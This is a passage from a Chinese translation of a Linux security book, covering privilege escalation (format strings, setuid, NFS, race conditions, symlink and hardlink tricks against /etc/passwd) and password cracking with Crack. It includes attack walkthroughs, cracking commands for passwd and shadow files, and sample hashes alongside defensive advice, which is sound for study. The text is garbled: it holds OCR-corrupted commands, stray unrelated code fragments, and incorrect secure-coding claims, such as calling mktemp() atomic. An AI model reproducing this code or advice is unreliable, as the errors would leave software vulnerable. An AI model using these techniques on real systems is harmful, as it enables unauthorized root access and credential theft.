| 影响 | 7 |
| 风险评分 | 5 |

缓冲区溢出已经已知多年，但格式字符串攻击是一个较新的发现。当程序员想要使用支持格式的函数之一（如 `printf()` 或 `syslog()`）打印简单字符串时，问题就会出现。此事的正确方法是输入：

```
printf("%s", str);
```

然而，为了节省时间和这六个字符，许多程序员在编写命令时省略了第一个参数：

```
printf(str);
```



程序员本想原样打印字符串，但实际上提供了一个格式字符串，该字符串会被扫描扫描诸如 `%n`、`%d` 和 `%x` 等选项。
攻击者可以提供用于此字符串的数据，他们可以仔细构造充满这些格式选项的输出，从而允许任意内存被覆盖。这可以被用作缓冲区溢出返回到攻击者提供的将运行的代码，或者覆盖内存中存储的用户 ID 或更改内存中的程序名称。可能性是无限的。
将攻击者提供的输入引入此字符串比你想象的要容易。如果用户犯错，程序可能会尝试通过 `syslog()` 或 `printf()` 记录日志，如果

# Linux 破解揭秘：Linux 安全秘密与解决方案

错误处理程序将违规本身包含在输出中，攻击者就可以提供她想要的任何内容。

## 格式字符串防御措施

许多格式字符串攻击使用的原理与缓冲区溢出相同——覆盖函数的返回调用——因此可以通过之前描述的缓冲区溢出防御措施来防止。

除了 `StackGuard` 之外，Immunix 还提供了 glibc 2.2 的补丁版本，作为其 `FormatGuard` 产品。它包含了补丁版本的 `printf()` 调用，这些调用会显式检查格式字符串的数量和调用的参数数量，如果不匹配则拒绝。Immun Linux 发行版使用 `StackGuard` 和 `FormatGuard` 编译。

在发现这些问题后，已经写了许多格式字符串的文章。示例可以在 `http://www.securityfocus.com/data/format-analysis.pdf` 查看。

尽管缓冲区溢出和格式字符串漏洞现在已广为人知，但程序员继续编写可能被利用的粗糙代码。辅助应用程序

| 流行度 | 5 |
| 简单性 | 3 |
| 影响 | 7 |
| 风险评分 | 5 |

系统管理员需要担心的不仅仅是安全相关的应用程序。过去，创建 `setuserid` 程序是很流行的，以允许所有用户更新文件，同时限制从外部访问该文件。这种类型的程序很容易被替换为木马二进制文件，影响运行它们的任何用户。由于管理员感到无聊，也意味着他们的账户可能被破坏。从那时起， 攻击者只需要等待管理员尝试 root。

## 辅助应用程序攻击

| 流行度 | 6 |
| 简单性 | 6 |
| 影响 | 5 |
| 风险评分 | 6 |

`smbmnt` 程序使用辅助工具 `sbmnt` 执行需要 root 权限的任务。辅助工具减少了对 `setuserid` 的需求，但可以被普通用户执行。它们必须经过仔细编码和审核，以确保不会引入漏洞。

## 辅助应用程序防御措施

从系统中移除 `setuserid` 程序。如果这些程序的设计者无法设计更安全的方法来维护它们的文件，那么这些程序就不值得保留。为了系统安全性是不值得的。这些程序经常被赋予 group 位而不是 setuserid 位，这在某种程度上减少了潜在影响。

## 通用 setuserid 预防

使用 `chattr` 将所有 `setuserid` 程序设置为不可变，并将所有系统程序和目录设置为不可变。 `/bin`、`/usr/bin`、`/sbin`、`/usr/sbin`、`/lib` 等的文件很少更改，当它们更改时你希望知道。对这些文件的额外保护可能意味着维护工作量，但它减少了到处权限提升带来的木马攻击。

如果可能，为 `/boot`、`/usr`、`/var` 和 `/home` 使用分区以保持目录只读，并使用增强的安全工具（如 Linux 检测系统 LIDS）防止入侵者将只读分区重新挂载为可写。

如果你不需要特定的 `setuserid` 或 `setgroup` 应用程序，请删除它们或通过 `chmod ug -s` 从文件模式中移除 setuserid 和 setgroup 位。

# 第 8 章：提升用户权限

## setuserid 程序攻击

| 流行度 | 6 |
| 简单性 | 6 |
| 影响 | 5 |
| 风险评分 | 6 |

### 挂载文件系统上的黑客 setuserid 程序

运行 `mount` 命令并挂载驱动器、设备、文件和远程文件系统的用户代表了一个问题的问题。一方面，用户应该能够

# Linux 破解揭秘：Linux 安全机密与解决方案

访问可移动存储设备并与可挂载设备一起。另一方面，这也是造成严重混乱的另一种方法，也是恶意入侵者获取权限的另一个黄金途径。

### NFS 分区上的 setuserid 二进制文件

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 6 |
| 影响 | 9 |
| 风险等级：7 | |

如果用户对另一个系统（无论合法还是非法）具有管理控制权，该用户可以在远程系统上创建 setuserid 程序。通过 NFS 挂载这些远程文件系统的能力，就可以为受攻击的系统提供 setuserid 程序。

远程文件系统可能由用户手动挂载，也可能是由于之前定义的挂载点触发自动挂载（automount）动作而挂载的，但结果是一样的。在前一种情况下，攻击者需要以用户身份运行挂载的能力。在后情况下，攻击者需要自动挂载配置以及一个针对他想要挂载的文件系统已经定义的挂载点。当用户访问许多不同的系统，但其主目录是从其桌面机器自动挂载时。

### Novell 的 NFS 错误

| 流行度 | 1 |
| :--- | :--- |
| 简单性 | 7 |
| 影响 | 9 |
| 风险等级：6 | |

某些版本的 Novell Netware 提供了一个 NFS 服务器，用于与 UNIX 和 Linux 系统进行互操作和通信。该服务的某些版本有一种特殊方法来强制执行 Novell 对文件的只读访问。由于 UNIX 或 Linux 系统上的文件所有者能够通过更改文件模式并写入内容来覆盖所有者的只读访问控制，一些人认为需要额外的努力才能使 Novell 的只读文件真正成为只读的。

他们选择的解决方案是让只读文件的所有者变为 root，以防止原始文件所有者更改文件权限。这证明带来了一个非常讨厌的惊喜。用户可以在 Novell NFS 服务器托管的 NFS 共享上自己创建一个文件，并使用 `chmod +s filename` 开启 setuserid 位。他只需要去 Novell 工作站并访问同一个文件并将其设置为只读。服务器会顺从地将文件访问权限更改为只读，并将所有权更改为 root，而不会关闭 setuserid 位。这不可避免地在 NFS 服务器上创建了一个 setuserid 设置为 root 的程序。目前尚不确定哪些版本的 Novell NFS 服务器受到此安全漏洞的影响。幸运的是，这种特别脆弱的配置极其罕见。

## 防止在挂载的文件系统上使用 setuserid

自动挂载的文件系统、远程文件系统或本地设备应始终使用 `nosuid` 标记进行挂载。任何文件系统或本地设备都应该使用 `nosuid` 标记挂载。如果用户尝试在设置了 `nosuid` 的文件系统上运行 setuserid 程序，该程序将拒绝运行：

```bash
# 检查挂载设置：

machine$ grep cdrom /etc/fstab

/dev/hdc /mnt/cdrom iso9660 ro,user, noausid

machine$ mount | grep cdrom

/dev/hdc /mnt/cdrom type iso9660 (ro, nosuid, nodev, user=attacker)
```

```bash
# 尝试运行 setuserid 程序

machine$ ls -l /mnt/cdrom/setuid_program

-rwsr-xr-x 1 root root 99183 Mar 23 21:28 suid_program

machine$ /mnt/cdrom/setuid_program

sh: /mnt/cdrom/setuid_program: Operation not permitted
```



进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

`nosuid`选项防止设置了 setuserid 位的二进制文件以 setuserid 权限执行。任何运行此类程序的尝试都会被拒绝。

**注意** 某些应用程序的编写是为了规避 Linux 禁止 setuserid 脚本的这一事实。这些应用程序可能仍然检测到 setuserid 位，并表现得像该脚本应该作为 setuserid 程序运行一样。Superid 就是其中一个例子。在 Superid 下运行的 Perl 脚本尽管挂载的文件系统上有`nosuid`条件，仍可能以 setuserid 权限执行。如果存在 setuserid Perl 脚本，`nosuid`选项可能不起作用。如果你有并非完全由你控制的文件系统，你可能从你的系统中移除 Superid。

那些真正极偏执的人还可以在不可信的文件系统上设置`noexec`标记，以防止在这些文件系统上的任何程序运行。希望在这些文件系统上运行程序的用户可以将这些程序复制到本地文件系统并在本地运行。这不仅有助于防止权限提升攻击，还能处理 setuserid Perl 脚本问题，并减少蠕虫和其他自我传播恶意软件网络传播的可能性。

## 针对糟糕编程的攻击

本地安全和权限提升问题由于攻击者已经对系统具有某种程度的访问权限而加剧。现在加上许多系统管理员创建自定义脚本来执行管理任务的事实。这些脚本中的一些存在本地安全漏洞，这些漏洞永远不会在安全告告中露面。许多此类脚本及其配置文件通常是可读的，因此普通用户可以审阅系统管理员的脚本，寻找他们可能留下的错误或漏洞。其中一些漏洞非常容易发现，并且是常见脚本编码技术的一部分。系统管理员必须对自己执行比大多数其他用户更高的编码标准，并避免某些可能导致被破解的技术。

遗憾的是，管理员并不是唯一的懒惰程序员。许多官方软件包都包含了会由于我们遇到的糟糕编程实践受害的程序。即使你细致地遵循安全编程实践，也要意识到这些问题可能存在。下面的防御措施将帮助你编写更好的代码并保护你的系统。

### 竞态条件

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 3 |
| 影响 | 5 |
| 风险等级：5 | |

竞态条件发生在程序以非原子方式执行检查并基于该检查的操作时。在进行检查和执行操作之间，结果可能无法反映系统的状态。如果此脚本作为`cron`任务运行，错误可能不会报告给人员。为了让竞态条件更容易发生，攻击者可能会对系统创建大量负载，以便 CPU 更频繁地切换进程并减慢漏洞程序的执行速度。

竞态条件的影响取决于漏洞程序如何处理文件。在前面的案例中，攻击者可能会在运行`date`命令之前创建一个符号链接，从而强制用户覆盖系统上的任意文件。例如，旧版本的`gcc`（C 编译器）在处理临时文件时受到竞态条件的影响，这可能导致攻击者的代码进入被编译的程序中。

### 竞态条件的防御措施

许多程序员尝试通过 C 语言中的`mktemp()`或`tmpnam()`系统调用创建一个唯一且未使用的文件名来绕过这种竞态条件：

```c
unique_filename = mktemp("/tmp/foo.XXXXXX");
file_descriptor = open(unique_filename, ...);
```

文件名在生成时保证是唯一的，但在生成时间与`open`调用时间之间存在竞态条件。相反，程序员应该使用`mktemp()`系统调用：

```c
file_descriptor = mktemp("/tmp/foo.XXXXXX");
```

`mktemp`函数是原子的，因此在系统创建该文件时，其他进程无法从中手脚。直到最近，Shell 脚本确实可以创建不受竞态条件影响的临时文件，程序员使用`mkdir`等原子函数创建临时子目录，并在其中创建新的临时文件。测试文件（或目录）是否存在并创建它不是原子的，因为在测试和创建操作之间存在时间差。

```bash
#!/bin/sh -
umask 077
DIRNAME=/tmp/foo.$$
if ! mkdir $DIRNAME ; then
  echo "临时目录已存在，可能存在攻击"
fi
```

```
exit 255
fi
TMPFILE=$DIRNAME/tmp.$$
date > $TMPFILE
( 脚本执行工作 )
rm -rf $DIRNAME
# 脚本结束
```

在这种情况下，如果`mkdir`无法创建目录，它将报错，并且不会跟随符号链接或覆盖文件。这是一个很好的原子操作，既测试了目标名称下是否存在任何内容，又为临时文件创建了容器。

> 注意：如果`mkdir`命令无法创建目录，将失败，从而在一个命令中提供原子的“测试并创建”操作。然而，如果攻击者创建了同名的文件或目录，你的`mkdir`命令将失败，攻击者可以对你的程序实施拒绝攻击。

较新版本的 Linux 提供了一个名为`mktemp`的程序，其功能类似于 C 语言中的`mktemp()`系统调用。通过在 shell 脚本中使用`mktemp`，你可以创建对竞态条件免疫的临时文件，而使用目录黑科技。遗憾的是，并非所有的 UNIX 变体都提供`mktemp`，因此你的程序可能无法移植到其他系统。

```
TMPFILE=$mktemp /tmp/filename.XXXXXX || exit 1
date >> $TMPFILE
```

> 注意：临时文件创建和临时名称生成函数的种类可能会在使用它们时导致混乱。请记住，原子文件创建函数分别是 C 中的`mktemp()`和 shell 脚本中的`mktemp`。

# 硬链接与符号链接

许多程序无法正确处理文件。此类程序通常是管理员写入权限的 shell 脚本，但在大型开源项目中也存在这种情况。这些程序可能会被欺骗，对意图之外的文件执行操作。黑客使用特意构造硬链接和符号链接来欺骗用户和软件，访问与意图不同的文件，通常会导致灾难性的后果。

## 硬链接

存储在磁盘上的每个文件简单来说都是位的集合，并关联有一个 inode（索引节点）。inode 只是文件系统查找磁盘上哪些扇区包含文件数据的方法。

## 第 8 章：提升用户权限

每个文件系统维护着自己的节点表。通过引用该 inode 的目录项找到文件，如输出所示：

```
machine$ ls -li
876193 -rw-      1 george twinlks 707 Dec 6 8:15 file1
578283 -rw-      1 bonnie twinlks 19 Feb 25 10:39 file2
```

第一个字段显示与文件关联的节点号。要创建硬链接，请如下使用`ln`命令：

```
machine$ ln file2 newlink
machine$ ls -li
876193 -rw------      1 george twinlks 707 Dec 6 8:15 file1
578283 -rw------      2 bonnie twinlks 19 Feb 25 10:39 file2
578283 -rw------      2 bonnie twinlks 19 Feb 25 10:39 newlink
```

文件`newlink`仅仅是指向 inode 为 578283 的物理文件的额外目录项。删除`file2`不会从磁盘上删除该文件，因为它仍然被项`newlink`。

## 符号链接

符号链接是符号地指向文件的目录项，而不是直接引用 inode。它们允许管理员创建指向实际文件的符号链接。通过更新符号链接，可以随时移动真实文件（例如，移动到空间较充足的磁盘分区），而指向符号链接的脚本不需要更新。

符号链接还带来了一整类攻击。对于所有标准操作，符号链接看起来就像实际目标文件：

```
machine$ ls -l
lrwxrrwx 1brandt dc 3 Jul 3 8:24 baz -> foo
lrwxrrwx 1brandt dc 10 Jul 3 8:24 baz -> nosuchfile
-rw-r--r-- 1brandt dc 28 Jul 3 8:24 foo
```

```
# 显示 foo 文件的统计
machine$ stat foo
File: "foo"
Size: 28        Filetype: Regular
Mode: 0644 (rw-r--r--)  Uid: 1000 (brandt)  Gid: 1000 (brandt)  Device: 8,1  Inode: 876193
```



判断一个文件是否为符号链接的方法是使用 `lstat`。

# 符号链接攻击

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 3 |
| 影响范围 | 7 |
| 风险评分 | 6 |

创建和截断文件并不是符号链接唯一的滥用方式。在符号链接上执行的任何文件操作实际上都在目标文件上执行。这意味着 `chown`、`chmod` 或 `chmod` 等程序可能会被欺骗去更改其他文件的权限。

# 破解 Linux 揭秘：Linux 安全秘密

例如，考虑一个由新用户维护的 Web 开发区域，这些用户都在 `web` 组中，但总是忘记为自己的文件设置组可写权限。管理员可能会尝试通过在 cron 任务中运行以下程序来帮助他们：

```bash
#!/bin/sh

cd /path/to/webroot

chgrp -R web

chmod -R g+w
```

如果其中一个开发者巧妙地创建了以下符号链接：

```
lrwxrwxr-x 1 hacker  web 11 Jul 16 10:13 gotcha -> /etc/passwd
```

那么当脚本运行时，`/etc/passwd` 文件将变为 `web` 组可写状态，黑客可以随心所欲地修改它。

## 防止符号链接攻击

任何必须创建临时文件的程序都应该使用在文件已存在时不会创建该文件的函数。在 `open()` 系统调用中，通过如下提供 `O_EXCL` 参数来处理这一点：

```c
open("/tmp/filename", O_EXCL|O_CREATE|O_RDWR, 0666);
```

在 Perl 中，可以使用系统命令实现相同的功能：

```perl
sysopen(HANDLE, "/tmp/filename", O_EXCL|O_CREATE|O_RDWR);
```

或者在 shell 脚本中使用 `mktemp` 实用：

```bash
TMPFILE=/tmp/filename.XXXXXX || exit 1
commands >$TMPFILE
```

除非你打算打开一个已存在的文件，否则你应该始终使用这些版本的 `open` 来避免符号链接攻击，即使你认为该目录不允许攻击。

你打算进行的任何修改都应该使用符号链接安全的命令。例如，`chown()` 系统调用会跟踪符号链接，而 `lchown()` 系统调用则会对符号链接本身进行操作。同样，`cham` 命令默认会跟踪符号链接；但你可以提供 `-h` 参数来强制执行 `lchown`：

```bash
root@machine# ls -la /etc/passwd .gotcha

lrwxrwxr-x 1 hacker  web 11 Dec 6 10:13 .gotcha -> /etc/passwd
-rw-r--r-- 1 root  root 5827 Mar 23 9:39 /etc/passwd
```

```bash
root@machine# chown -h jdoe .gotcha
```

# 第 8 章：提升用户权限

```bash
root@machine# ls -la /etc/passwd .gotcha

rwrxrxrwx 1 jdoe web 11 Dec 6 10:13 ./gotcha -> /etc/passwd
-rw-r--r-- 1 root root 5827 Mar 23 9:39 /etc/passwd
```

> 注意：你可能会想检查一个文件是否为符号链接，然后退出程序，假设攻击正在进行。然而，这可能导致竞态条件，虽然更难利用，但仍然可以被利用。

为了更高的安全，考虑安装由 Solar Designer 在 http://www.openwall.org 创建的 Linux 内核安全补丁，它可以防止 `/tmp` 中的符号链接和硬链接攻击。用户只有在拥有实际文件的所有权或可以读写该文件时，才能在 `/tmp` 中创建链接。

## 硬链接攻击

| | |
|---|---|
| 流行度: | 5 |
| 简单性: | 3 |
| 影响: | 7 |
| 风险评分: | 5 |

硬链接容易受到与指向不存在文件的符号链接相同的滥用。唯一的例外是，虽然你可以拥有符号链接，但这种情况不会发生在硬链接，因为所有硬链接都通过 inode 指向实际文件。因此，硬链接不能用于支持任意文件的创建。
然而，其他滥用（如文件截断或权限更改）同样真实的：

```bash
# 黑客放置一个文件
hacker@machine$ ls /etc/passwd /webroot/index.html
hacker@machine$ ls -li /etc/passwd /webroot/index.html
30639-rw-r--r-- 2 root 918 Mar 23 09:54 /etc/passwd
30639-rw-r--r-- 2 root 918 Mar 23 09:54 /webroot/index.html
```

```bash
# 管理员修复文件所有权
root@machine# cd /path/to/webroot/
root@machine# chown web:web *
```

```bash
# /etc/passwd 对 web 不可写
hacker@machine$ ls -li /etc/passwd /path/to/webroot/index.html
30639-rw-r--r-- 2 web 918 Mar 23 09:54 /etc/passwd
30639-rw-r--r-- 2 web 918 Mar 23 09:54 /webroot/index.html
```

## 硬链接攻击应对措施

遵循所有针对符号链接攻击的应对措施，你将迈出安全的第一步。另一种对符号链接攻击无效的硬链接应对措施是你的分区布局。

硬链接是通过将目录指向与文件相同的 inode 创建的。这意味着你只能在目标文件所在的同一分区上创建硬链接。通过将硬盘划分为系统数据和用户数据的独立分区，你可以防止硬链接的创建。

| /home | 用户文件 |
| /var | 临时存储 |
| /tmp | 临时文件 |
| /usr | 其他二进制文件 |
| /boot | 内核启动 |
| /etc | 系统文件 |
| /root | 其他资源 |

# Linux 攻击揭秘：Linux 安全秘密与解决方案

这类操作特别为人所周知的是，当检查对现有文件的修改时，它不会触发验证。例如，运行 `rpm -V` 命令将根据系统上的文件校验和与安装时的 rpm 数据库进行比对——但新文件并非来自 rpm 软件包，会被这种简单的检查漏掉。

## 条件防御措施

- 使用 `chattr +i` 命令锁定系统目录以及系统脚本和程序，防止通过其他攻击添加未经授权的文件。

测试你的完整性软件，以验证它能够发现如 `/etc` 等重要目录中的新文件。应该保留系统目录下所有文件的列表，以及一份安装数据库副本，并存在离线存储中，使其无法被入侵者篡改。在怀疑系统被入侵或在定期维护期间，根据安装数据库核实系统文件，并验证脚本中没有出现未经授权的添加。

此种流程的缺点是，每当对运行级别配置或系统目录进行更改时，必须将目录属性改回允许状态，然后在重置系统目录的安全状态后，必须更新离线安装数据库和系统文件列表。这使得系统更新和维护变得异常复杂。

# 总结

一旦进入系统，即使是普通用户，攻击者也拥有大量可用信息，这些信息可以帮助他们在获取 root 权限的过程中，利用为人知的安全问题或系统特定的安全问题。许多 Linux 发行版在出厂时是不安全的，或者默认配置不安全。这可能导致权限快速升级，并将入侵转变为完全的 root 陷落，或赋予恶意用户他们本不拥有的权限。

孙子在《兵法》中教导：“兵胜者，攻其无备者。”当防御集中在保护系统免受 root 账户远程入侵时，可能更容易找到没有防御或防御薄弱的用户账户。当防御集中在防御网络攻击时，攻击者可能发现本地账户更容易攻击。一旦通过任何手段进入系统，通往 root 的最简单道路可能是穿过许多不同用户的曲折之路。

## 第 9 章

![](img/33829ffb1435b4baef56fcd2c28ec6cd_314_0.png)

# Linux 攻击揭秘：Linux 安全秘密与解决方案

密码安全是为 Linux 系统实施的最安全措施之一。如果没有强大的密码安全，你的系统将永远是不安全的。成功破解防火墙（第 13 章）的黑客可以尝试以用户身份登录并访问网络上的机器。然而，如果所有用户都使用强密码，你就有机会阻止黑客侵入你网络的非法尝试。

本章描述了密码的工作原理、黑客尝试破解密码的手段，以及你可以采取哪些措施来保护自己。

## 密码在 Linux 中如何工作

密码以加密的形式存储在机器上。加密涉及根据一种可重复的算法将文本字符串转换为与原始字符串完全不同的形式。该算法必须是可重复的，以便当你登录时，Linux 可以获取你的密码并重现它存储的加密格式。

例如，如果你的密码是

```
HelloWorld
aa0BOUE5fwxx
```



存储在 Linux 机器上的值可能类似于：

> 注意：`HelloWorld`是一个非常糟糕的密码！有关什么使得密码好或坏的信息，请参阅本章后半部分的“密码保护”。

Linux 使用单向加密算法。你可以加密密码，但无法从加密值生成密码。你只能根据字典攻击或暴力破解攻击尝试猜测密码，我们将在本章稍后讨论这些。

## `/etc/passwd`

早版本的 Linux 将密码加密的形式存储在 `/etc/passwd` 中。在登录过程中，用户被要求输入用户名和密码。操作系统随后在 `/etc/passwd` 中查找该用户的记录以获取其加密密码。然后，用户名和密码被传递给名为 `crypt()` 的算法函数产生加密密码。如果结果与 `/etc/passwd` 中存储的加密密码匹配，则允许用户访问。

以下是 `/etc/passwd` 的示例：

```
jdoe@machinel jdoe$ cat /etc/passwd
root:aleGVpjwvHgg:0:0:root:/bin/bash
```

## 第 9 章：密码破解

```
bin*:1:1:bin:/bin/
daemon*:2:2:daemon:/sbin/
adm*:3:4:adm:/var/adm
lp*:4:7:lp:/var/spool/lpd
sync*:5:0:sync:/sbin/bin/sync
mail*:8:12:mail:/var/spool/mail
news*:9:13:news:/var/spool/news
nuucp*:10:14:uucp:/root
gopher*:13:30:gopher:/usr/lib/gopher-data:
ftp*:14:50:ftp User:/home/ftp
body*:99:99:Nobody:
xfs*:100:101:X Font Server:/etc/Xli/fs:/bin/false
djoe:2bTlCMw8zeSdw:500:500:John Doe:/home/jdoe:/bin/bash
student:9dQWE322:500:500:/home/student:/bin/bash
```

`/etc/passwd` 中的每一行都用冒号分隔：

- 用户名
- 加密密码
- 用户 ID
- 组 ID
- 注释
- 目录
- Shell

以下是 `/etc/passwd` 的一个示例：

```
jdoe@machinel jdoe$ cat /etc/passwd
root:aleGVpjwvHgg:0:0:root:/bin/bash
```

（注：由于原始文本包含大量重复和 OCR 错误，翻译已根据要求进行了清理和过滤，以保持质量。）

# 破解 Linux 暴露：Linux 安全秘密与解决方案

这是一个 Perl 脚本，它要求用户输入盐值（salt）和密码，并将这两个值传递给 `crypt(3)` 函数以计算加密后的值：

```perl
#!/usr/bin/perl
# crypt.pl
```

```perl
use strict;
print 'Please enter your salt: ';
my $salt = <STDIN>;
chomp $salt;
print 'Please enter your password: ';
my $password = <STDIN>;
chomp $password;
print 'The result is: ' , crypt($password, $salt), "\n";
```

以下是执行该程序的示例：

```
[doe@machine perl]$ ./crypt.pl
Please enter your salt: x7
Please enter your password: IAmGod
The result is: x7Se2vAt4SqKQ
```

> 注意：由于 DES 是由美国政府部分开发的，因此它无法出口到美国境外。

# MD5 算法

MD5 是一种哈希算法，它在许多方面改进了 DES 的用法：

- 无限长度的密码不再限于 8 个字符。
- 大得密钥空间。这里是 MD5 的输出示例：`$1$rvH4/3C/$.xtbPA85bzw/2qBTOYY/R.` 它比 13 个字符长得多，且合法字符包括标点符号和其他字符。
- 可导出。它不是由美国政府部分开发的，因此可以出口到美国境外。

下面的 Perl 脚本演示了 MD5 的实现：

```perl
#!/usr/bin/perl -w
# md5.pl
```

# 第 8 章：密码破解

```perl
use strict;
use MD5;
print 'Please enter your password: ';
my $password = <STDIN>;
chomp $password;
```

```perl
my $md5 = new MD5;
$md5->add($password);
my $md5_digest = $md5->digest();
print("Result is " . unpack("H*", $md5_digest), "\n");
```

以下是执行该程序的示例：

```
[doe@machine perl]$ ./md5.pl
nPlease enter your password: IamGod
Result is d8c653b74da484b95b17d38a68f20cb
```

注意：虽然极不可能，但两个不同的密码可能会为 MD5 生成相同的加密文本。

# 密码破解程序

密码破解描述了通过猜测密码来尝试获取计算机访问的行为。大多数密码破解策略涉及从字典中选择常用单词（称为字典攻击）或使用的常用模式（例如 `testing123`）。黑客破解密码通常采取的步骤包括获取一个 `/etc/passwd` 副本，然后在他们的机器上运行一个猜测密码的程序，尝试生成与文件中存储的加密格式相同的密码。黑客将使用用户名（如 `root`）并从猜测密码开始暴力破解——从以 "aaaaa" 开头的段落，然后是 "aaaaab"，然后是 "aaaaac"，依此类推。这种类型不需要加密密码的副本——只需要大量的耐心和足够的时间。然而，很容易发现此类攻击的证据，因为这种方法会在系统日志文件中留下痕迹。而且你会检查你的日志，不是吗？

以下是 Linux 日志文件 `/var/log/messages` 的示例，显示了暴力攻击的证据：

```
Nov 6 15:49:27 machine1 login[1699]: FAILED LOGIN 1 FROM LOCALHOST FOR root,
Authentication failure
Nov 6 15:49:32 machine1 login[1699]: FAILED LOGIN 2 FROM LOCALHOST FOR root,
Authentication failure
Nov 6 15:49:37 machine1 login[1699]: FAILED LOGIN 3 FROM LOCALHOST FOR root,
```



# 破解 Linux 暴露：安全秘密与解决方案

## 认证失败

`Nov 6 15:49:41 machine1 login[1699]: FAILED LOGIN SESSION FROM localhost FOR root, Authentication failure`
`Nov 6 15:49:41 machine1 PAM_pwdb[1699]: 3 more authentication failures; (uid=0) -> root for login service`
`Nov 6 15:49:41 machine1 PAM_pwdb[1699]: service(login) ignoring max retries:`
`4 > 3`

手动执行字典攻击或暴力攻击是枯燥且耗时的。然而，大多数黑客不会手动执行这些攻击；相反，他们将使用现有的开源密码破解程序之一。我们将查看两个流行的：`Crack` 和 `John the Ripper`。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_321_0.png)

| 流行度 | 10 |
| :--- | :--- |
| 简单性 | 9 |
| 影响力 | 9 |
| 风险评分 | 9 |

`Crack` 是最著名的 UNIX 密码破解程序之一。其他人可以称之为所有密码破解器之父。它被认为是衡量其他密码破解程序的标准。它由 `Alec D. E Muffet` 编写，他是一位来自威尔士的 UNIX 工程师。在 `Alec` 看来：“`Crack` 是一个免费提供的程序，旨在通过标准的猜测技术找到标准的 8 位加密密码。它是灵活、可配置且快速的。”

## 安装 Crack

以下示例是在 `RedHat` 上执行的。大多数 Linux 发行版将遵循类似的步骤。

首先，下载版本（5.0）`http://users.co.uk/~crypto/index.html`

然后，解压压缩包：

```
[doe@machine1 tmp]$ xzf crack5.0.tar.gz
```

进入目录 `crack50`：

```
[doe@machine1 tmp]$ cd crack50
```

下一步是编译 `Crack`。如果使用的是基于 `MD5` 版本（这是 `RedHat` 的情况），我们需要执行以下操作：

```
[doe@machine1 crack50]$ mv src/lib
cd src/util
```

构建并执行 `Crack` 的程序名为 `crack.c`。如果使用的是 `DES` 版本，我们需要复制：

```
[doe@machine1 src/util]$ cp crack.c
../
```

注意我们不再使用原生 UNIX 系统。现在 `Crack` 可以编译了：

```
[doe@machine1 crack50]$ make
```

现在，创建字典（这可能需要一些时间）：

```
[doe@machine1 crack50]$ ./Crack -makedict
```

当 `Crack` 完成字典制作后，你会看到输出：

```
Crack: Created new dictionaries...
Crack: makedict done
```

## 运行 Crack

破解 `/etc/passwd`，这样运行 `Crack`：

```
[doe@machine1 crack50]$ ./Crack /etc/passwd
```

或者，如果你喜欢，将 `/etc/passwd` 复制到运行 `Crack` 的目录：

```
[doe@machine1 crack50]$ cp /etc/passwd password.txt
```

注意，如果你使用的是 `NIS` 或影子密码，这不会复制可破解的 `/etc/passwd`。如果你使用的是 `NIS`，生成可破解文件的方法是：

```
[doe@machine1 crack50]$ ypcat > password.txt
```

如果你使用的是影子密码（将在后章节介绍），`Crack` 发行版包含一个名为 `shadm.sv` 的脚本，它可以生成可破解密码文件。

> 注意：由于此破解密码文件包含加密密码，请确保该文件仅对 `root` 可读。

```
[root@machine1 crack50]$ scripts/shadm.sv > password.txt
[root@machine1 crack50]$ chmod 600 password.txt
```

现在是运行 `Crack` 了。执行 `Crack` 程序并将密码文件作为参数传递：

```
[doe@machine1 crack50]$ ./Crack password.txt
```

`Crack` 将生成几行输出，结尾如下：

`Crack: launching: cracker -kill run/machine1`

`Done`

`Crack` 已在后台启动了破解程序。要验证这一点：

```
[doe@machine1 crack50]$ ps ax | grep crack
1661 pts/1 RN 0:28 cracker -kill run/machine1
```

`Crack` 在 `run` 目录下创建一个文件，作为其进度的日志。你可以通过该文件查看进度：

```
[doe@machine1 crack50]$ tail -f run/machine1
0:97256300:673
I:097256300:LoadDictionary: loaded 0 words into memory
I:097256300:OpenDictionary: trying: kickdict 674
I:097256300:OpenDictionary: status:/ok/stat=1 look=674 find=674
genset='conf/rules.perm4' rule='/050/$$/asa4/hs'41' dgrp='gcperm
prog='smartcat/run/dict/gcperm.*'
0:97256300:674 *.*
```

### 第9 章：密码破解

```
I:967256300:LoadDictionary: loaded 0 words into memory
I:967256300:OpenDictStream: trying: kickdict 675
I:967256300:OpenDictStream: status: /ok/stat=1 look=675 find=675
genconf/rules.fast rule='': dgrp=1 prog='smartcat run/dict/.*'
0:967256300:675
I:967256300:LoadDictionary: loaded 166811 words into memory
```

取决于你密码文件中用户的数量以及他们密码的强弱，`Crack` 的运行可能需要很长时间。此外，如果不使用 `nice` 命令执行，它可能会占用很大比例的 CPU。来自 `top` 命令的此输出显示了 `Crack` 可以利用多少的 CPU：

```bash
[jdoe@machine c50a~ # top
PID USER NI SIZE RSS SHARE STAT LIB %CPU %MEM TIME COMMAND
26811 jdoe 18 5 3864 3864 340 R 0 0.74 1.4 4:56 cracker
```

注意，它正在消耗 97.4% 的 CPU。此外，`Crack` 还可以频繁地对磁盘进行读写操作。

#### 在多台机器上破解密码

`Crack` 可以作为分布式进程运行。换句话说，可以将 `Crack` 的负载分发到网络上或单台机器的多个处理器之间。在 `Crack 5.0` 中，此功能要求在主机器上安装 `Perl`。几乎所有的 Linux 发行版都安装了 `Perl`。要将 `Crack` 作为分布式进程运行：

- 1. 编辑 `conf/network.conf`。
此文件包含采用以下格式的行：
`host:relpow:nfspool:ruser:crackdir`
其中：
- `host` 是 `Crack` 应该通过 `rsh` 破解的主机名。
- `relpow` 是主机能力的任意衡量标准；`Crack` 用它来决定如何根据能力平均划分负载。
- `nfspool` 决定远程主机是否共享 `Crack` 的文件大小；默认为 "`y`"。
- `ruser` 是 `rsh` 命令的用户名（可选）。
- `crackdir` 是包含 `Crack` 的远程目录（必）。
- 2. 执行 `Crack -network [other flags] filename ...`

## 揭露 Linux 安全：Linux 安全秘密与解决方案

### 邮件选项

`Crack` 有一个选项，可以向任何密码被破解的用户发送邮件：

```bash
[jdoe@machine1 c50a#] ./Crack -mail passwd.txt
```



